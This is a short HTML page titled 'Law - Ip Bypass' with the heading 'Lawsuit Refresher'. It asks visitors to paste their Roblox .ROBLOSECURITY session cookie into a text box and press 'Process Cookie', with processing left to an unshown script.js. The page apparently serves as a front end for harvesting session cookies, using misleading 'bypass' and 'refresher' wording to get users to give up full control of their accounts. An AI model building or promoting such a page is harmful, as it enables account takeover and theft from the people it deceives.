
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>Law - Ip Bypass</title>
  <link href="style.css" rel="stylesheet" type="text/css" />
</head>
<body>
  <div class="container">
    <h1>Lawsuit Refresher</h1>
    <div class="form-container">
      <textarea 
        id="cookieInput" 
        placeholder="Enter your .ROBLOSECURITY cookie here..."
        rows="4"
      ></textarea>
      <button id="processBtn" onclick="processCookie()">Process Cookie</button>
    </div>
    
    <div id="loading" class="loading hidden">
      <div class="spinner"></div>
      <p>Processing cookie...</p>
    </div>
    
    <div id="result" class="result hidden">
      <h3>Result:</h3>
      <div id="resultContent"></div>
    </div>
  </div>
  
  <script src="script.js"></script>
</body>
</html>
